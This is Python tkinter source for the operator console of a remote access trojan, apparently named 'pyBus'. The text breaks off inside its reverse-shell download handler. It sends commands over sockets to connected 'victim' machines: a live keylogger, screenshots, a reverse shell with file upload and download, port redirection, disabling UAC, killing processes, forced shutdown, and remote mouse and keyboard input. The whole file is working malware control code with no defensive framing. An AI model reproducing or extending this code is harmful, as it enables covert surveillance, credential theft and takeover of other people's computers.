from tkinter import *
from PIL import ImageTk, Image
import tkinter.ttk
from tkinter import messagebox
from tkinter import filedialog
import os
import sys
import signal
import ctypes
import functools
import threading
import time
import pyautogui
import socket
import collections
import random
import pickle


class Application:
    def __init__(self, master=None):

        self.font = ('Arial', 8, 'bold')
        width = '15'
        height = 1

        buttons = [('Server admin','self.server_admin'),
                   ('Open CD-ROM','self.open_cdrom'),
                   ('Show image','self.show_image'),
                   ('Port Redirect','self.port_redirect'),
                   ('Start program','self.start_program'),
                   ('Msg manager','self.msg_manager'),
                   ('Screendump','self.screendump'),
                   ('Get info','self.get_info'),
                   ('Disable UAC','self.disableUAC'),
                   ('Play sound','self.play_sound'),
                   ('Exit Windows','self.exit_windows'),
                   ('Send text','self.send_text'),
                   ('Active wnds','self.active_wnds'),
                   ('Enable UAC','self.enableUAC'),
                   ('Mouse pos','self.mouse_pos'),
                   ('Listen','self.listen'),
                   ('Active process','self.active_process'),
                   ('Change wallpaper','self.change_wallpaper'),
                   ('Reverse shell','self.reverse_shell'),
                   ('Control Mouse','self.control_mouse'),
                   ('Go to URL','self.go_to_url'),
                   ('Key manager','self.key_manager'),
                   ('File Manager','self.file_manager'),
                   ('Waiting for connections','self.waiting_for_connections'),
                   ('About','self.about')]

        self.buttonID = {}
        
        x,y = 10,10
        for button in buttons:

            if button[0] == 'Disable UAC':
                x = 132
                y = 100

            elif button[0] == 'Enable UAC':
                x = 254
                y = 100

            elif button[0] == 'Mouse pos':
                self.entry1 = Entry(root, width='6',font=self.font)
                self.entry1.insert(0,'0')
                self.entry1.place(x=x+10 ,y=y+3)
                var['self_entry1'] = self.entry1

                self.entry2 = Entry(root, width='6',font=self.font)
                self.entry2.insert(0,'0')
                self.entry2.place(x = x+60 ,y=y+3)
                var['self_entry2'] = self.entry2
               
                y += 30

            elif button[0] == 'Change wallpaper':
                x = 376
                y = 70

            elif button[0] == 'Waiting for connections':
                width = '30'
                height = 4
                #height = 1
                x = 142
                y = 20

            elif button[0] == 'About':
                width = '15'
                height = 1
                x = 376
                y = 10
                
            
            self.button = Button(root, text=button[0], width=width, height=height,
                                 font=self.font, command=eval(button[1]))

            self.buttonID[button[0]] = self.button
            self.button.place(x=x, y=y)
            y += 30

        self.portLabel = Label(root, text='Local port:', font=self.font)
        self.portLabel.place(x=380, y=40)

        self.port = Entry(root, font=self.font, width='6')
        self.port.insert(0, '666')
        self.port.place(x=445, y=40)

        self.statusbar = Label(root, bd=1, relief='sunken', width='68',
                               text='No connection', anchor=W, font=self.font)
        self.statusbar.place(x=10,y=250)
        

    def action(self,send_action):
        var = self.statusbar['text']
        current_IP = var[13: var.find('ID:')].rstrip()
        current_ID = var[var.find('ID:'):]
        current_socket = clients[(current_IP,current_ID)]

        try:
            current_socket.send(send_action)
        except:
            messagebox.showerror('Error', 'Not connected')
            remove_IP = list(clients.keys()).index((current_IP,current_ID))
            self.listbox.delete(remove_IP)
            current_socket.close()
            del current_socket

            #Restore Everything to orignal states
            self.buttonID['Open CD-ROM']['text'] = 'Open CD-ROM'
            self.buttonID['Show image']['text'] = 'Show image'
            
            self.buttonID['Control Mouse']['text'] = 'Control Mouse'
            self.statusbar['text'] = 'No connection'
            self.waiting_for_connections_button['text'] = 'Connect'

    def server_admin(self):
        self.buttonID['Server admin'].focus_set()

        if self.statusbar['text'] != 'No connection':
            self.server_admin = create_window('Server admin')
            center_window(self.server_admin, 130, 35)               
            button = Button(self.server_admin, text='Remove server', font=self.font,
                                    width='15', height=1, command=self.server_admin_remove_server)
            button.pack(pady='5')
            
    def server_admin_remove_server(self):
        self.action(b'remove')
        self.server_admin.destroy()
        try:
            var = self.statusbar['text']
            current_IP = var[13: var.find('ID:')].rstrip()
            current_ID = var[var.find('ID:'):]
            current_socket = clients[(current_IP,current_ID)]
            self.statusbar['text'] = 'No connection'
            remove_IP = list(clients.keys()).index((current_IP,current_ID))
            self.listbox.delete(remove_IP)
            current_socket.close()
            del current_socket
            self.waiting_for_connections_button['text'] = 'Connect'
            self.server_admin.destroy()
        except:
            pass
            
    def open_cdrom(self):
        self.buttonID['Open CD-ROM'].focus_set()

        if self.statusbar['text'] != 'No connection':

            if self.buttonID['Open CD-ROM']['text'] == 'Open CD-ROM':
                self.buttonID['Open CD-ROM']['text'] = 'Close CD-ROM'
                self.action(b'openCD')
            else:
                self.buttonID['Open CD-ROM']['text'] = 'Open CD-ROM'
                self.action(b'closeCD')

    def show_image(self):
        self.buttonID['Show image'].focus_set()
        font = ('MS Sans Serif', 8)

        if self.statusbar['text'] != 'No connection':

            if self.buttonID['Show image']['text'] == 'Remove image':
                self.action(b'removeimage')
                self.buttonID['Show image']['text'] = 'Show image'
            else:
                self.show_image = create_window('Image')
                center_window(self.show_image, 270, 100)

                self.label = Label(self.show_image, text='JPG-file in format C:\\victim\\Photos\\img.jpg',
                                           font=font)
                self.label.pack(padx=10, pady=10, anchor='w')

                self.show_image_entry = Entry(self.show_image, width='40', font=font)

                self.show_image_entry.insert(0, var['show_image'])
                self.show_image_entry.pack()

                self.frame = Frame(self.show_image)
                self.frame.pack(pady='10')

                button = Button(self.frame, text='OK', font=font, width='10', height=1, command=self.show_image_show_image)
                button.pack(side='left', padx='5')

                button = Button(self.frame, text='Cancel', font=font, width='10',
                                        height=1)
                button['command'] = functools.partial(self.destroy, self.show_image)
                button.pack(padx='5')
    
    def show_image_show_image(self):
        try:
            var['show_image'] = self.show_image_entry.get()
            self.action(b'showimage')
            self.action(self.show_image_entry.get().encode())
            self.buttonID['Show image']['text'] = 'Remove image'
        except:
            pass
        finally:
            self.show_image.destroy()

    def port_redirect(self):
        self.buttonID['Port Redirect'].focus_set()
        if self.statusbar['text'] != 'No connection':
            self.port_redirect = create_window('Port Redirect')
            center_window(self.port_redirect, 310, 115)

            Label(self.port_redirect, font=self.font, text='Listen (on victim) TCP-port:').place(x=10, y=20)
            Label(self.port_redirect, font=self.font, text='Redirect host:').place(x=10, y=50)
            Label(self.port_redirect, font=self.font, text='Redirect TCP-port:').place(x=10, y=80)

            self.port_redirect_listen = Entry(self.port_redirect)
            self.port_redirect_listen.place(x=170, y=20)

            self.port_redirect_host = Entry(self.port_redirect)
            self.port_redirect_host.place(x=170, y=50)

            self.port_redirect_port = Entry(self.port_redirect, width=6)
            self.port_redirect_port.place(x=170, y=80)

            self.port_redirect_button = Button(self.port_redirect, font = self.font, text= 'Start', width=9,
                                               command = self.port_redirect_port_redirect)
            self.port_redirect_button.place(x=220, y=77)

    def port_redirect_port_redirect(self):
        
        try:
            int(self.port_redirect_listen.get())
        except:
            messagebox.showerror('Error', "Use only numbers for Listen TCP-port")
            return
        try:
            int(self.port_redirect_port.get())
        except:
            messagebox.showerror('Error', "Use only numbers for Redirect TCP-port")
            return
        
        if int(self.port_redirect_listen.get()) == 999:
            messagebox.showerror('Error', "Don't use port 999")

        elif int(self.port_redirect_listen.get()) >= 1024:
            messagebox.showerror('Error', '"Listen (on victim) TCP-port" must < 1024')

        elif self.port_redirect_listen.get() == '':
            messagebox.showerror('Error', '"Listen (on victim) TCP-port" not defined')

        elif self.port_redirect_host.get() == '':
             messagebox.showerror('Error', '"Redirect host" not defined')

        elif self.port_redirect_port.get() == '':
            messagebox.showerror('Error', '"Redirect TCP-port" not defined')
            
        else:  
            try:
                data = 'LISTEN:%sHOST:%sPORT:%s' %(self.port_redirect_listen.get(), self.port_redirect_host.get(), self.port_redirect_port.get())
                self.action(b'portfw')
                self.action(data.encode())
                messagebox.showinfo('Info', 'Port Redirect started!\nVictim port: %s\nHost: %s\nHost port: %s' %(self.port_redirect_listen.get(), self.port_redirect_host.get(), self.port_redirect_port.get()))
            except:
                self.port_redirect.destroy()

    def start_program(self):
        self.buttonID['Start program'].focus_set()
        font = ('MS Sans Serif', 8)

        if self.statusbar['text'] != 'No connection':

            self.start_program = create_window('Application')
            center_window(self.start_program, 270, 100)

            self.label = Label(self.start_program, text='Aplication to start:', font=font)
            self.label.pack(padx=10, pady=10, anchor='w')

            self.start_program_entry = Entry(self.start_program, width='40', font=font)

            self.start_program_entry.insert(0, var['start_program'])
            self.start_program_entry.pack()

            self.frame = Frame(self.start_program)
            self.frame.pack(pady='10')

            button = Button(self.frame, text='OK', font=font, width='10',
                                            height=1, command = self.start_program_start_program)
            button.pack(side='left', padx='5')

            button = Button(self.frame, text='Cancel', font=font, width='10', height=1)
            button['command'] = functools.partial(self.destroy, self.start_program)
            button.pack(padx='5')

    def start_program_start_program(self):
        try:
            var['start_program'] = self.start_program_entry.get()
            self.action(b'startprogram')
            self.action(self.start_program_entry.get().encode())
        except:
            pass
        finally:
            self.start_program.destroy()

    def msg_manager(self):
        self.buttonID['Msg manager'].focus_set()

        if self.statusbar['text'] != 'No connection':

            self.msg_manager = create_window('Message manager')
            center_window(self.msg_manager, 310, 240)

            Label(self.msg_manager, relief='groove', width=17,height=10).place(x=10,y=10)
            Label(self.msg_manager, relief='groove', width=17,height=10).place(x=175,y=10)

            Label(self.msg_manager, text='Type', font=self.font).place(x=20, y=15)
            Label(self.msg_manager, text='Buttons', font=self.font).place(x=180, y=15)

            Type = [("Information",'MB_ICONINFORMATION'),
                    ("Question",'MB_ICONQUESTION'),
                    ("Warning",'MB_ICONWARNING'),
                    ("Stop",'MB_ICONSTOP')]
            self.Type1 = StringVar()
            self.Type1.set('MB_ICONINFORMATION')  
            y = 40
            for txt, val in Type:
                Radiobutton(self.msg_manager, text=txt, variable=self.Type1,
                            font=self.font, value=val).place(x=25,y=y)
                y += 22

            Buttons = [("OK",'MB_OK'),
                       ("OK/Cancel",'MB_OKCANCEL'),
                       ("Retry/Cancel",'MB_RETRYCANCEL'),
                       ("Yes/No",'MB_YESNO'),
                       ("Yes/No/Cancel",'MB_YESNOCANCEL') ]
            self.Type2 = StringVar()
            self.Type2.set('MB_OK')  
            y = 40
            for txt, val in Buttons:
                Radiobutton(self.msg_manager, text=txt, variable=self.Type2,
                            font=self.font, value=val).place(x=190,y=y)
                y += 22

            Label(self.msg_manager, text='Message', font=self.font).place(x=8, y=180)
            self.msg_manager_entry = Entry(self.msg_manager, font=self.font)
            self.msg_manager_entry.insert(0, var['msg_manager'])
            self.msg_manager_entry.place(x=10, y=200)

            self.msg_manager_button = Button(self.msg_manager, font=self.font, text='Send msg',
                                             command=self.msg_manager_send)
            self.msg_manager_button.place(x=170, y = 195)

            self.msg_manager_button = Button(self.msg_manager, font=self.font, text='Close')
            self.msg_manager_button['command'] = functools.partial(self.destroy, self.msg_manager)
            self.msg_manager_button.place(x=250, y = 195)

    def msg_manager_send(self):
        try:
            var['msg_manager'] = self.msg_manager_entry.get()
            data = self.Type1.get()+ self.Type2.get() + 'Text:' + self.msg_manager_entry.get() + 'End:'
            if len(data) < 100:
                data += '0'
            self.action(b'msg_manager')
            self.action(data.encode())
        except:
            self.msg_manager.destroy()
        

    def screendump(self):
        self.buttonID['Screendump'].focus_set()

        if self.statusbar['text'] != 'No connection':
            try:
                #self.action(b'0'*1024)
                self.action(b'screendump')
                
                var = self.statusbar['text']
                current_IP = var[13: var.find('ID:')].rstrip()
                current_ID = var[var.find('ID:'):]
                current_socket = clients[(current_IP,current_ID)]

                #Receive image
                len_screenshot = int(current_socket.recv(1024).split()[0])
                file = b''
                while len(file) < len_screenshot:
                    screenshot = current_socket.recv(1024)
                    file += screenshot
                        
                #screenshot = current_socket.recv(len_screenshot)
                
                with open('screenshot.jpg', 'wb') as img:
                    img.write(file)

                if sys.platform == 'win32':
                    os.startfile('screenshot.jpg')
                elif sys.platform == 'linux':
                    subprocess.call(['xdg-open', 'screenshot.jpg'])
            except:
                pass         

    def get_info(self):
        self.buttonID['Get info'].focus_set()
        if self.statusbar['text'] != 'No connection':
            try:
                self.action(b'getinfo')
                
                var = self.statusbar['text']
                current_IP = var[13: var.find('ID:')].rstrip()
                current_ID = var[var.find('ID:'):]
                current_socket = clients[(current_IP,current_ID)]
                packet = current_socket.recv(1024).decode() 
                PATH = packet[5: packet.index('RESTART:')]
                RESTART = packet[packet.index('RESTART:') +8 : packet.index('LOGIN_ID:')]
                LOGIN_ID = packet[packet.index('LOGIN_ID:')+9: packet.index('ARCHITECTURE:') ]
                ARCHITECTURE = packet[packet.index('ARCHITECTURE:')+13: packet.index('PLATFORM:') ]
                PLATFORM = packet[packet.index('PLATFORM:')+ 9:]
                messagebox.showinfo('Info', 'Program Path: %s\n\
Restart persistent: %s\n\
Login ID: %s\n\
Architecture: %s\n\
Platform: %s' %(PATH,RESTART,LOGIN_ID,ARCHITECTURE,PLATFORM))
            except:
                pass
            
    def disableUAC(self):
        self.buttonID['Disable UAC'].focus_set()
        if self.statusbar['text'] != 'No connection':
            try:
                self.action(b'pyBus')
                self.action(b'disableUAC')
                messagebox.showinfo('Info', 'Victim computer was rebooted to apply changes')
            except:
                pass
            

    def play_sound(self):
        self.buttonID['Play sound'].focus_set()
        font = ('MS Sans Serif', 8)

        if self.statusbar['text'] != 'No connection':
            self.play_sound = create_window('Sound')
            center_window(self.play_sound, 270, 100)

            self.label = Label(self.play_sound, text='WAV-file in format C:\\victim\\Music\\sound.wav',
                                           font=font)
            self.label.pack(padx=10, pady=10, anchor='w')

            self.play_sound_entry = Entry(self.play_sound, width='40', font=font)

            self.play_sound_entry.insert(0, var['play_sound'])
            self.play_sound_entry.pack()

            self.frame = Frame(self.play_sound)
            self.frame.pack(pady='10')

            button = Button(self.frame, text='OK', font=font, width='10', height=1, command=self.play_sound_play_sound)
            button.pack(side='left', padx='5')
            

            button = Button(self.frame, text='Cancel', font=font, width='10',
                                        height=1)
            button['command'] = functools.partial(self.destroy, self.play_sound)
            button.pack(padx='5')               
            

    def play_sound_play_sound(self):
        try:
            var['play_sound'] = self.play_sound_entry.get()
            self.action(b'playsound')
            self.action(var['play_sound'].encode())
        except:
            pass
        finally:
            self.play_sound.destroy()

    def exit_windows(self):
        self.buttonID['Exit Windows'].focus_set()

        if self.statusbar['text'] != 'No connection':
            
            self.exit_windows = create_window('Shutdown')
            center_window(self.exit_windows, 175, 75)

            self.frame = Frame(self.exit_windows)
            self.frame.pack()
            self.frame2 = Frame(self.exit_windows)
            self.frame2.pack()

            self.logoff = Button(self.frame, font=self.font,
                   text='Logoff', height=1, width=9, command=self.exit_windows_logoff)
            self.logoff.pack(side='left', pady=10, padx=5)

            self.poweroff = Button(self.frame, font=self.font,
                   text='Power off', height=1, width=9, command=self.exit_windows_poweroff)
            self.poweroff.pack(pady=10, padx=5)

            self.reboot = Button(self.frame2, font=self.font,
                   text='Reboot', height=1, width=9, command=self.exit_windows_reboot)
            self.reboot.pack(side='left', padx=5)

            self.shutdown = Button(self.frame2, font=self.font,
                   text='Shutdown', height=1, width=9, command=self.exit_windows_shutdown)
            self.shutdown.pack(padx=5)

    def exit_windows_logoff(self):
        self.action(b'logoff')
        try:
            var = self.statusbar['text']
            current_IP = var[13: var.find('ID:')].rstrip()
            current_ID = var[var.find('ID:'):]
            current_socket = clients[(current_IP,current_ID)]
            self.statusbar['text'] = 'No connection'
            remove_IP = list(clients.keys()).index((current_IP,current_ID))
            self.listbox.delete(remove_IP)
            current_socket.close()
            del current_socket
            self.waiting_for_connections_button['text'] = 'Connect'
        except:
            pass
        self.exit_windows.destroy()

    def exit_windows_poweroff(self):
        self.action(b'poweroff')
        try:
            var = self.statusbar['text']
            current_IP = var[13: var.find('ID:')].rstrip()
            current_ID = var[var.find('ID:'):]
            current_socket = clients[(current_IP,current_ID)]
            self.statusbar['text'] = 'No connection'
            remove_IP = list(clients.keys()).index((current_IP,current_ID))
            self.listbox.delete(remove_IP)
            current_socket.close()
            del current_socket
            self.waiting_for_connections_button['text'] = 'Connect'
        except:
            pass
        self.exit_windows.destroy()

    def exit_windows_reboot(self):
        self.action(b'reboot')
        try:
            var = self.statusbar['text']
            current_IP = var[13: var.find('ID:')].rstrip()
            current_ID = var[var.find('ID:'):]
            current_socket = clients[(current_IP,current_ID)]
            self.statusbar['text'] = 'No connection'
            remove_IP = list(clients.keys()).index((current_IP,current_ID))
            self.listbox.delete(remove_IP)
            current_socket.close()
            del current_socket
            self.waiting_for_connections_button['text'] = 'Connect'
        except:
            pass
        self.exit_windows.destroy()

    def exit_windows_shutdown(self):
        self.action(b'shutdown')
        try:
            var = self.statusbar['text']
            current_IP = var[13: var.find('ID:')].rstrip()
            current_ID = var[var.find('ID:'):]
            current_socket = clients[(current_IP,current_ID)]
            self.statusbar['text'] = 'No connection'
            remove_IP = list(clients.keys()).index((current_IP,current_ID))
            self.listbox.delete(remove_IP)
            current_socket.close()
            del current_socket
            self.waiting_for_connections_button['text'] = 'Connect'
        except:
            pass
        self.exit_windows.destroy()

    def send_text(self):
        self.buttonID['Send text'].focus_set()
        font = ('MS Sans Serif', 8)
        
        if self.statusbar['text'] != 'No connection':
            self.send_text = create_window('Text')
            center_window(self.send_text, 270, 100)
            self.label = Label(self.send_text, text='Text to send ("|" represents Enter):', font=font)
            self.label.pack(padx=10, pady=10, anchor='w')

            self.send_text_entry = Entry(self.send_text, width='40', font=font)

            self.send_text_entry.insert(0, var['send_text'])
            self.send_text_entry.pack()

            variable = self.send_text_entry.get()

            self.send_text_entry.bind('<Return>', self.send_text_send_text)

            self.frame = Frame(self.send_text)
            self.frame.pack(pady='10')

            self.button_ALT_TAB = Button(self.frame, text='ALT-TAB', font=('Arial', 7, 'bold'), width=8)
            self.button_ALT_TAB['command'] = functools.partial(self.send_text_send_text, 'ALT-TAB')
            self.button_ALT_TAB.pack(side='left', padx = 5)
            self.buttonID['ALT-TAB'] = self.button_ALT_TAB

            self.button_CTRL_ESC = Button(self.frame, text='CTRL-ESC', font=('Arial', 7, 'bold'), width=8)
            self.button_CTRL_ESC['command'] = functools.partial(self.send_text_send_text, 'CTRL-ESC')
            self.button_CTRL_ESC.pack(side='left', padx = 5)
            self.buttonID['CTRL-ESC'] = self.button_CTRL_ESC

            self.button_TAB = Button(self.frame, text='TAB', font=('Arial', 7, 'bold'), width=8)
            self.button_TAB['command'] = functools.partial(self.send_text_send_text, 'TAB')
            self.button_TAB.pack(side='left', padx = 5)
            self.buttonID['TAB'] = self.button_TAB

    def send_text_send_text(self, variable=None):
        try:
            var['send_text'] = self.send_text_entry.get()
            self.action(b'send_text')

            if variable == 'ALT-TAB':
                self.action(b'%{TAB}')
                self.buttonID['ALT-TAB'].focus_set()

            elif variable == 'CTRL-ESC':
                self.action(b'^{ESC}')
                self.buttonID['CTRL-ESC'].focus_set()

            elif variable == 'TAB':
                self.action(b'{TAB}')
                self.buttonID['TAB'].focus_set()

            else:
                self.action(var['send_text'].encode())
        except:
            self.send_text.destroy()

            
    def active_wnds(self):
        self.buttonID['Active wnds'].focus_set()

        if self.statusbar['text'] != 'No connection':
            self.active_wnds = create_window('Active windows')
            center_window(self.active_wnds, 370, 190)
            self.frame = Frame(self.active_wnds)
            self.frame.pack()

            self.frame2 = Frame(self.active_wnds)
            self.frame2.pack()

            self.active_wnds_listbox = Listbox(self.frame, width=57, height=8)
            self.active_wnds_listbox.pack(pady=12)

            Buttons = [('Refresh', 'self.active_wnds_refresh'),
                       ('Kill wnd', 'self.active_wnds_kill'),
                       ('Focus wnd', 'self.active_wnds_focus'),
                       ('Close', 'self.active_wnds_close')]
            for button in Buttons:
                self.button = Button(self.frame2, font=self.font, width=9, text=button[0], command=eval(button[1]))
                self.button.pack(side='left', padx=5)
                self.buttonID[button[0]] = self.button

    def active_wnds_refresh(self):
        self.buttonID['Refresh'].focus_set()        
        try:
            self.action(b'active_wnds_refresh')
            self.action(b'0'*1024)
            
            var = self.statusbar['text']
            current_IP = var[13: var.find('ID:')].rstrip()
            current_ID = var[var.find('ID:'):]
            current_socket = clients[(current_IP,current_ID)]

            len_active_wnds = int(current_socket.recv(1024))
            active_wnds = current_socket.recv(len_active_wnds)
            windows = pickle.loads(active_wnds)
            
            self.active_wnds_listbox.delete(0,END)
            for x in windows:
                self.active_wnds_listbox.insert(END, "{0:12}{1}".format(str(x[0]), x[1]))
        except:
            self.active_wnds.destroy()

    def active_wnds_kill(self):
        self.buttonID['Kill wnd'].focus_set()
        try:
            PID = self.active_wnds_listbox.get(self.active_wnds_listbox.curselection())
            PID = PID[: PID.index(' ')]
            self.active_wnds_listbox.delete(self.active_wnds_listbox.curselection())
            self.action(b'active_wnds_kill')
            self.action(PID.encode()) 
        except:
            self.active_wnds.destroy()

    def active_wnds_focus(self):
        self.buttonID['Focus wnd'].focus_set()
        try:
            PID = self.active_wnds_listbox.get(self.active_wnds_listbox.curselection())
            PID = PID[: PID.index(' ')]
            self.action(b'active_wnds_focus')
            self.action(PID.encode()) 
        except:
            self.active_wnds.destroy()

    def active_wnds_close(self):
        self.active_wnds.destroy()

    def enableUAC(self):
        self.buttonID['Enable UAC'].focus_set()
        if self.statusbar['text'] != 'No connection':
            try:
                self.action(b'pyBus')
                self.action(b'enableUAC')
                messagebox.showinfo('Info', 'Victim computer was rebooted to apply changes')
            except:
                pass

    def mouse_pos(self):
        self.buttonID['Mouse pos'].focus_set()

        if self.statusbar['text'] != 'No connection':
            packet = '%sx%sX' %(self.entry1.get(), self.entry2.get())

            #Ugly but works
            for x in range(100):
                if len(packet) < 100:
                    packet += '0'
            
            try:
                self.action(b'mousepos')
                self.action(packet.encode())
            except:
                pass
        
    def listen(self):
        self.buttonID['Listen'].focus_set()
        if self.statusbar['text'] != 'No connection':
            self.listen = create_window('Online keylogger')
            self.listen.protocol("WM_DELETE_WINDOW", self.stop_keylogger_before_close)
            center_window(self.listen, 415, 165)
            self.listen_text = Text(self.listen, height=7, width=49)
            self.listen_text.place(x=10,y=10)

            self.button_start = Button(self.listen, text='Start', font=self.font, width=10, command=self.listen_start)
            self.button_start.place(x=10,y=135)
            self.buttonID['Listen start'] = self.button_start

            self.button_clear = Button(self.listen, text='Clear', font=self.font, width=10, command = self.listen_clear)
            self.button_clear.place(x=100,y=135)

            self.button_save = Button(self.listen, text='Save text', font=self.font, width=10, command = self.save_text)
            self.button_save.place(x=190,y=135)


    def listen_start(self):
        self.buttonID['Listen start'].focus_set()
        if self.button_start['text'] == 'Start':
            self.button_start['text'] = 'Stop'
            try:
                self.action(b'keylogger')
                self.action(b'start')

                threading.Thread(target=self.listen_start_start).start()

            except:
                self.button_start['text'] = 'Start'

        elif self.button_start['text'] == 'Stop':
            self.button_start['text'] = 'Start'
            try:
                self.action(b'keylogger')
                self.action(b'stop')
            except:
                pass

    def listen_start_start(self):
        var = self.statusbar['text']
        current_IP = var[13: var.find('ID:')].rstrip()
        current_ID = var[var.find('ID:'):]
        current_socket = clients[(current_IP,current_ID)]
        while True:
            if self.button_start['text'] == 'Start':
                break
            else:
                try:
                    key = int(current_socket.recv(4).decode())
                    if key == 13:
                        self.listen_text.insert(END, '[Enter]')
                    elif key == 8:
                        self.listen_text.insert(END, '[Backspace]')
                    else:
                        self.listen_text.insert(END, chr(key))
                except:
                    pass

    def listen_clear(self):
        self.listen_text.delete('1.0', END)

    def save_text(self):
        if self.button_start['text'] == 'Stop':
            messagebox.showerror('Error', 'Stop keylogger before save text')
            
        elif self.button_start['text'] == 'Start':
            file = filedialog.asksaveasfile(mode='w', initialfile='log.txt',filetypes = (("Text Files", "*.txt"),("All files", "*.*") ))
            if file is None:
                return
            log = str(self.listen_text.get('1.0', END))
            file.write(log)
            file.close()

    def stop_keylogger_before_close(self):
        if self.button_start['text'] == 'Stop':
            messagebox.showerror('Error', 'Stop keylogger before close window')
        elif self.button_start['text'] == 'Start':
            self.listen.destroy()

    def active_process(self):
        self.buttonID['Active process'].focus_set()

        if self.statusbar['text'] != 'No connection':
            self.active_process = create_window('Active process')
            center_window(self.active_process, 370, 190)
            self.frame = Frame(self.active_process)
            self.frame.pack()

            self.frame2 = Frame(self.active_process)
            self.frame2.pack()

            self.active_process_listbox = Listbox(self.frame, width=57, height=8)
            self.active_process_listbox.pack(pady=12)

            Buttons = [('Refresh', 'self.active_process_refresh'),
                       ('Kill process', 'self.active_process_kill'),
                       ('Close', 'self.active_process_close')]
            for button in Buttons:
                self.button = Button(self.frame2, font=self.font, width=10, text=button[0], command=eval(button[1]))
                self.button.pack(side='left', padx=5)
                self.buttonID[button[0]] = self.button

    def active_process_refresh(self):
        self.buttonID['Refresh'].focus_set()        
        try:
            self.action(b'active_process_refresh')
            var = self.statusbar['text']
            current_IP = var[13: var.find('ID:')].rstrip()
            current_ID = var[var.find('ID:'):]
            current_socket = clients[(current_IP,current_ID)]

            len_active_process = int(current_socket.recv(1024))
            active_process = current_socket.recv(len_active_process)
            windows = pickle.loads(active_process)
            
            self.active_process_listbox.delete(0,END)
            for x in windows:
                self.active_process_listbox.insert(END, "{0:12}{1}".format(str(x[0]), x[1]))
        except:
            self.active_process.destroy()

    def active_process_kill(self):
        self.buttonID['Kill process'].focus_set()
        try:
            PID = self.active_process_listbox.get(self.active_process_listbox.curselection())
            PID = PID[: PID.index(' ')]
            self.active_process_listbox.delete(self.active_process_listbox.curselection())
            self.action(b'active_process_kill')
            self.action(PID.encode()) 
        except:
            self.active_process.destroy()

    def active_process_close(self):
        self.active_process.destroy()


    def change_wallpaper(self):
        self.buttonID['Change wallpaper'].focus_set()
        font = ('MS Sans Serif', 8)
        
        if self.statusbar['text'] != 'No connection':
            
            self.change_wallpaper = create_window('Change wallpaper (Only BMP)')
            center_window(self.change_wallpaper, 270, 100)

            self.label = Label(self.change_wallpaper, text='New wallpaper: (C:\Victim\Photos\wallpaper.bmp)',
                                           font=font)
            self.label.pack(padx=10, pady=10, anchor='w')

            self.change_wallpaper_entry = Entry(self.change_wallpaper, width='40', font=font)

            self.change_wallpaper_entry.insert(0, var['change_wallpaper'])
            self.change_wallpaper_entry.pack()

            self.frame = Frame(self.change_wallpaper)
            self.frame.pack(pady='10')

            button = Button(self.frame, text='OK', font=font, width='10', height=1, command=self.change_wallpaper_change_wallpaper)
            button.pack(side='left', padx='5')
            

            button = Button(self.frame, text='Cancel', font=font, width='10',
                                        height=1)
            button['command'] = functools.partial(self.destroy, self.change_wallpaper)
            button.pack(padx='5')               
            
    def change_wallpaper_change_wallpaper(self):
        try:
            var['change_wallpaper'] = self.change_wallpaper_entry.get()
            self.action(b'change_wallpaper')
            self.action(var['change_wallpaper'].encode())
            messagebox.showinfo('Info', 'Logout/reboot victim computer to apply changes')
        except:
            pass
        finally:
            self.change_wallpaper.destroy()        

    def reverse_shell(self):
        self.buttonID['Reverse shell'].focus_set()
        
        if self.statusbar['text'] != 'No connection':
            self.reverse_shell = create_window('pyBus reverse shell')
            center_window(self.reverse_shell, 500, 550)
            self.frame = Frame(self.reverse_shell)
            self.frame.pack(pady=10)
            T = Text(self.frame, height=31, width=60)
            T.insert(END, '''\
                ____                      _          _ _ 
               |  _ \                    | |        | | |
    _ __  _   _| |_) |_   _ ___       ___| |__   ___| | |
   | '_ \| | | |  _ <| | | / __|     / __| '_ \ / _ \ | |
   | |_) | |_| | |_) | |_| \__ \     \__ \ | | |  __/ | |
   | .__/ \__, |____/ \__,_|___/     |___/_| |_|\___|_|_|
   | |     __/ |                                         
   |_|    |___/


Especial commands:

   upload      Upload file to victim.

               Type:
                    upload local_file victim_directory


   download    Download victim file.

               Type: 
                    download file.txt

Note:
   ?           Represents space bar. Example: 

               mkdir daniel?moreno

               Creates only one directory "daniel moreno",
               not directories "daniel" and "moreno"
''')
            T.config(state=DISABLED)
            T.pack()

            self.frame2 = Frame(self.reverse_shell)
            self.frame2.pack(side='left')
            self.entry = Label(self.frame2, font=self.font, text='shell :')
            self.entry.pack(side='left')

            self.reverse_shell_entry = Entry(self.frame2, width=75)
            self.reverse_shell_entry.pack()

            def get(event):
                command = event.widget.get()
                T.config(state=NORMAL)
                T.delete('1.0', END)
                T.insert(END, 'pyBus shell: ')
                T.insert(END, event.widget.get())
                T.insert(END, '\n')
                self.reverse_shell_entry.delete(0,END)

                try:

                    if command.split()[0] == 'upload':
                        if len(command.split()) != 3:
                            T.insert(END, '''

upload usage:
    upload local_file victim_directory


Example:
   upload document.txt C:\Victim\Documents





Note: local_file must be under pyBus directory

''')
                            T.config(state=DISABLED)
                            return

                        try:
                            with open(command.split()[1].replace('?', ' '), 'rb') as file:
                            #with open(command.split()[1], 'rb') as file:
                                upload_file = file.read()
                            
                        except FileNotFoundError as err:
                            T.insert(END, '\nError: File "%s" not found' %err.filename)
                            T.config(state=DISABLED)
                            return
                        except:
                            T.insert(END, '\nError: Upload not possible\nCheck if everything if OK')
                            T.config(state=DISABLED)
                            return
              
                        FILE = command.split()[1].encode()
                        DIRECTORY = command.split()[2].encode()
                        LEN_FILE = str(len(upload_file)).encode()

                        # Ugly but works =)
                        var = self.statusbar['text']
                        current_IP = var[13: var.find('ID:')].rstrip()
                        current_ID = var[var.find('ID:'):]
                        current_socket = clients[(current_IP,current_ID)]
                        packet = (b'upload ' + FILE + b' '+ DIRECTORY + b' '+LEN_FILE+ b' ').decode()
                        for x in range(1024):
                            if len(packet)<1024:
                                packet += '0'
                        self.action(b'reverse_shell')
                        self.action(packet.encode())
                        current_socket.sendall(upload_file)
                        T.config(state=DISABLED)


                    elif command.split()[0] == 'download':
                        
                        if len(command.split()) != 2:
                            T.insert(END, '''

download usage:
    download victim_file


Example:
   download document.txt
''')
                            T.config(state=DISABLED)
                            return
              
                        FILE = command.split()[1].encode()
                        packet = b'download ' + FILE
                        
                        self.action(b'reverse_shell')
                        self.action(packet)
                        var = self.statusbar['text']
                        current_IP = var[13: var.find('ID:')].rstrip()
                        current_ID = var[var.find('ID:'):]
                        current_socket = clients[(current_IP,current_ID)]
                        len_result = int(current_socket.recv(1024))
                        #result = current_socket.recv(len_result)
                        result = b''
                        while len(result) < len_result:
                            data = current_socket.recv(1024)
                            result += data
